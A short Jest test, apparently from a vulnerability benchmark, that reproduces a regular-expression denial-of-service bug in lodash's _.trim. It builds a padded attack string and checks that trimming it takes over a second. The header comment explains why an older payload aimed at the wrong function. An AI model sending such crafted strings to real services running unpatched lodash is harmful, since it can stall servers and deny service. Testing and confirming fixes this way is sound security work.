// patch.txt is the 4.17.21 fix that replaces `reTrim` (/^\s+|\s+$/g) with
// `baseTrim`/`trimmedEndIndex` in `_.trim`, `_.trimEnd` and `_.toNumber`.
// `_.lowerCase` goes through `words()` and never touches `reTrim`, so the old
// payload measured a code path the patch does not change.
test(
  "ReDos in lodash",
  () => {
    const genstr = require("../utils").genstr;
    const measureTime = require("../utils").measureTime;
    const _ = require("lodash");
    let attack_str = "1" + genstr(80000, " ") + "1";
    let t = measureTime(function () {
      let agent = _.trim(attack_str);
    });
    let time = t[0] + t[1] / 1000000000;
    expect(time).toBeGreaterThan(1);
  },
  60000
);
